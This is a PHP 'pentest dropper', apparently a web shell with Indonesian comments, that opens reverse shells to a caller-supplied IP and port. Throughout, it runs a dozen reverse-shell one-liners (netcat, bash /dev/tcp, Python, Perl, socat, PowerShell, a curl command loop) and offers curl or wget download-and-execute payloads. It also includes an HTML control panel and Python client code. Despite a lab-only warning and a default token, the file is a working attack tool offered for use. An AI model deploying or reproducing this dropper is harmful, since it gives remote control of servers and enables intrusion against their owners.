<?php
// Reverse Shell Dropper untuk Lab Pentest
// Token: PENTEST_LAB_TOKEN_2024 (Ganti dengan token Anda sendiri)

class PentestDropper {
    private $token = 'PENTEST_LAB_TOKEN_2024'; // GANTI DENGAN TOKEN ANDA
    private $timeout = 30;
    
    public function __construct() {
        // Set timeout eksekusi
        set_time_limit($this->timeout);
        
        // Validasi token
        if (!$this->validateToken()) {
            $this->sendError('Invalid or missing token');
        }
        
        // Validasi parameter
        if (!$this->validateParams()) {
            $this->sendError('Missing IP or Port parameter');
        }
        
        // Eksekusi reverse shell
        $this->executeReverseShell();
    }
    
    private function validateToken() {
        if (!isset($_GET['token']) || empty($_GET['token'])) {
            return false;
        }
        
        // Token harus sama dengan yang dikonfigurasi
        return hash_equals($this->token, $_GET['token']);
    }
    
    private function validateParams() {
        return isset($_GET['ip']) && isset($_GET['port']) && 
               filter_var($_GET['ip'], FILTER_VALIDATE_IP) && 
               is_numeric($_GET['port']) && 
               $_GET['port'] > 0 && $_GET['port'] <= 65535;
    }
    
    private function sendError($message) {
        header('HTTP/1.1 400 Bad Request');
        echo json_encode([
            'status' => 'error',
            'message' => $message,
            'timestamp' => time(),
            'server_info' => [
                'php_version' => PHP_VERSION,
                'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
                'server_addr' => $_SERVER['SERVER_ADDR'] ?? 'Unknown'
            ]
        ]);
        exit;
    }
    
    private function sendSuccess($data = []) {
        header('Content-Type: application/json');
        echo json_encode(array_merge([
            'status' => 'success',
            'timestamp' => time(),
            'execution_info' => [
                'ip' => $_GET['ip'],
                'port' => $_GET['port'],
                'method' => 'reverse_shell',
                'platform' => PHP_OS
            ]
        ], $data));
    }
    
    private function checkCapabilities() {
        $capabilities = [
            'exec_enabled' => function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions'))),
            'shell_exec_enabled' => function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions'))),
            'system_enabled' => function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions'))),
            'pcntl_enabled' => function_exists('pcntl_fork'),
            'curl_enabled' => function_exists('curl_init'),
            'socket_enabled' => function_exists('socket_create')
        ];
        
        // Check netcat variants
        $nc_variants = ['nc', 'ncat', 'netcat', 'nc.traditional'];
        foreach ($nc_variants as $nc) {
            $output = [];
            exec("which $nc 2>/dev/null", $output, $return);
            $capabilities["{$nc}_available"] = ($return === 0);
        }
        
        // Check writable directories
        $capabilities['tmp_writable'] = is_writable('/tmp');
        
        return $capabilities;
    }
    
    private function executeReverseShell() {
        $ip = $_GET['ip'];
        $port = (int)$_GET['port'];
        
        // Log aktivitas (untuk debugging lab)
        $this->logActivity($ip, $port);
        
        // Check capabilities terlebih dahulu
        $capabilities = $this->checkCapabilities();
        
        if (!$capabilities['exec_enabled']) {
            $this->sendSuccess([
                'message' => 'exec() function is disabled',
                'capabilities' => $capabilities,
                'alternative_payloads' => $this->getAlternativePayloads($ip, $port)
            ]);
            return;
        }
        
        // Multiple reverse shell methods
        $methods = $this->getReverseShellMethods($ip, $port);
        
        // Coba setiap metode sampai berhasil
        foreach ($methods as $method_name => $command) {
            if ($this->tryReverseShell($command, $method_name)) {
                $this->sendSuccess([
                    'message' => 'Reverse shell executed successfully',
                    'method_used' => $method_name,
                    'command' => $command,
                    'capabilities' => $capabilities
                ]);
                return;
            }
        }
        
        // Jika semua metode gagal
        $this->sendSuccess([
            'message' => 'All reverse shell methods failed',
            'capabilities' => $capabilities,
            'test_commands' => $this->getTestCommands($ip, $port),
            'payloads_tried' => array_keys($methods)
        ]);
    }
    
    private function getReverseShellMethods($ip, $port) {
        return [
            // 1. Original method dari request pertama
            'nc_mkfifo' => "rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/bash -i 2>&1 | nc $ip $port > /tmp/p 2>/dev/null &",
            
            // 2. Netcat dengan -e flag
            'nc_e' => "nc -e /bin/bash $ip $port 2>/dev/null &",
            
            // 3. Netcat tanpa -e (alternative)
            'nc_no_e' => "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $ip $port > /tmp/f 2>/dev/null &",
            
            // 4. Bash TCP
            'bash_tcp' => "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' 2>/dev/null &",
            
            // 5. Telnet method
            'telnet' => "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | telnet $ip $port > /tmp/f 2>/dev/null &",
            
            // 6. Python method
            'python' => "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2>/dev/null &",
            
            // 7. Python 3
            'python3' => "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2>/dev/null &",
            
            // 8. Perl method
            'perl' => "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' 2>/dev/null &",
            
            // 9. PHP method
            'php_self' => "php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");' 2>/dev/null &",
            
            // 10. Socat (jika tersedia)
            'socat' => "socat TCP:$ip:$port EXEC:'bash -li',pty,stderr,setsid,sigint,sane 2>/dev/null &",
            
            // 11. Powershell (untuk Windows/Linux dengan pwsh)
            'powershell' => "powershell -c \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};\$sendbytes = ([text.encoding]::ASCII).GetBytes('Windows PowerShell running as ' + \$env:username + ' on ' + \$env:computername + '`n');\$stream.Write(\$sendbytes,0,\$sendbytes.Length);\$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (pwd).Path + '> ');\$stream.Write(\$sendbytes,0,\$sendbytes.Length);while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\" 2>/dev/null &",
            
            // 12. Simple backdoor dengan curl/wget
            'curl_backdoor' => "while true; do curl -s http://$ip:$port/cmd 2>/dev/null | bash 2>&1 | curl -X POST -d @- http://$ip:$port/output 2>/dev/null; sleep 5; done &"
        ];
    }
    
    private function tryReverseShell($command, $method_name) {
        // Untuk keamanan lab, kita hanya mengeksekusi jika kondisi tertentu terpenuhi
        // Anda bisa menambahkan validasi tambahan di sini
        
        $output = [];
        $return_var = 0;
        
        // Eksekusi command
        exec($command . " echo 'Method: $method_name'", $output, $return_var);
        
        // Memberi waktu untuk koneksi
        sleep(1);
        
        // Cek jika proses masih berjalan
        exec("ps aux | grep -v grep | grep -E '(nc|bash|python|perl|php|socat|powershell|curl).*$ip.*$port'", $processes, $process_check);
        
        return ($process_check === 0 && !empty($processes));
    }
    
    private function getAlternativePayloads($ip, $port) {
        return [
            'curl_download' => "curl http://$ip:$port/shell.sh -o /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
            'wget_download' => "wget http://$ip:$port/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh",
            'php_socket' => "php -r '\$s=fsockopen(\"$ip\",$port);\$proc=proc_open(\"/bin/sh -i\", array(0=>\$s, 1=>\$s, 2=>\$s),\$pipes);'",
            'ruby' => "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$ip\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
            'lua' => "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('$ip','$port');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
        ];
    }
    
    private function getTestCommands($ip, $port) {
        return [
            'test_connection' => "timeout 2 bash -c 'cat < /dev/null > /dev/tcp/$ip/$port' && echo 'Connection successful' || echo 'Connection failed'",
            'check_listener' => "nc -zv $ip $port 2>&1",
            'test_curl' => "curl -s --connect-timeout 3 http://$ip:$port/test",
            'test_wget' => "wget --timeout=3 -qO- http://$ip:$port/test"
        ];
    }
    
    private function logActivity($ip, $port) {
        // Log untuk keperluan lab/testing
        $log_data = [
            'timestamp' => date('Y-m-d H:i:s'),
            'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
            'target_ip' => $ip,
            'target_port' => $port,
            'server' => $_SERVER['SERVER_NAME'] ?? 'Unknown',
            'script' => $_SERVER['PHP_SELF'] ?? 'Unknown'
        ];
        
        $log_file = '/tmp/pentest_dropper.log';
        $log_entry = json_encode($log_data) . PHP_EOL;
        
        @file_put_contents($log_file, $log_entry, FILE_APPEND);
    }
}

// API Mode untuk integrasi dengan Python
if (isset($_GET['api']) && $_GET['api'] == '1') {
    header('Content-Type: application/json');
    
    $dropper = new PentestDropper();
    exit;
}

// Simple HTML interface untuk testing manual
?>
<!DOCTYPE html>
<html>
<head>
    <title>Pentest Dropper API</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            margin: 20px;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            border: 1px solid #00ff00;
            padding: 20px;
            border-radius: 5px;
        }
        h1 {
            color: #00ff00;
            text-align: center;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
        }
        .status {
            background: #001100;
            padding: 10px;
            margin: 10px 0;
            border-left: 3px solid #00ff00;
        }
        .form-group {
            margin: 15px 0;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #00ff00;
        }
        input[type="text"],
        input[type="number"] {
            width: 100%;
            padding: 8px;
            background: #001100;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-family: 'Courier New', monospace;
        }
        button {
            background: #001100;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px 20px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
        }
        button:hover {
            background: #003300;
        }
        .api-endpoint {
            background: #001100;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #00ff00;
        }
        .warning {
            color: #ff9900;
            background: #331100;
            padding: 10px;
            margin: 10px 0;
            border-left: 3px solid #ff9900;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Pentest Dropper API</h1>
        
        <div class="warning">
            <strong>⚠️ WARNING:</strong> For authorized penetration testing in controlled lab environments only!
        </div>
        
        <div class="status">
            <strong>Status:</strong> API Ready<br>
            <strong>PHP Version:</strong> <?php echo PHP_VERSION; ?><br>
            <strong>Server:</strong> <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?><br>
            <strong>API Mode:</strong> Active
        </div>
        
        <div class="api-endpoint">
            <h3>📡 API Endpoint:</h3>
            <code>GET <?php echo $_SERVER['PHP_SELF']; ?>?token=YOUR_TOKEN&ip=TARGET_IP&port=TARGET_PORT&api=1</code>
        </div>
        
        <h3>🧪 Test Form:</h3>
        <form method="GET" id="testForm">
            <div class="form-group">
                <label for="token">Token:</label>
                <input type="text" id="token" name="token" value="PENTEST_LAB_TOKEN_2024" required>
            </div>
            <div class="form-group">
                <label for="ip">Target IP:</label>
                <input type="text" id="ip" name="ip" value="127.0.0.1" required>
            </div>
            <div class="form-group">
                <label for="port">Target Port:</label>
                <input type="number" id="port" name="port" value="4444" min="1" max="65535" required>
            </div>
            <input type="hidden" name="api" value="1">
            <button type="button" onclick="testAPI()">Test API Call</button>
        </form>
        
        <div id="result" style="margin-top: 20px; display: none;">
            <h3>📊 Response:</h3>
            <pre id="responseOutput" style="background: #001100; padding: 10px; overflow: auto;"></pre>
        </div>
        
        <h3>🐍 Python Integration:</h3>
        <pre style="background: #001100; padding: 10px;">
import requests

url = "<?php echo (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF']; ?>"
params = {
    'token': 'PENTEST_LAB_TOKEN_2024',
    'ip': 'YOUR_LISTENER_IP',
    'port': '4444',
    'api': '1'
}

response = requests.get(url, params=params)
print(response.json())
        </pre>
    </div>
    
    <script>
        function testAPI() {
            const form = document.getElementById('testForm');
            const formData = new FormData(form);
            const params = new URLSearchParams(formData);
            
            fetch(window.location.pathname + '?' + params.toString())
                .then(response => response.json())
                .then(data => {
                    document.getElementById('responseOutput').textContent = JSON.stringify(data, null, 2);
                    document.getElementById('result').style.display = 'block';
                })
                .catch(error => {
                    document.getElementById('responseOutput').textContent = 'Error: ' + error.message;
                    document.getElementById('result').style.display = 'block';
                });
        }
        
        // Auto-populate current server IP
        window.onload = function() {
            // Try to get server IP for testing
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('ip').value = data.ip;
                })
                .catch(() => {
                    // If failed, use localhost
                    document.getElementById('ip').value = '127.0.0.1';
                });
        };
    </script>
</body>
</html>
<?php
// Jika tidak ada parameter API, jalankan dropper normal
if (!isset($_GET['api'])) {
    new PentestDropper();
}
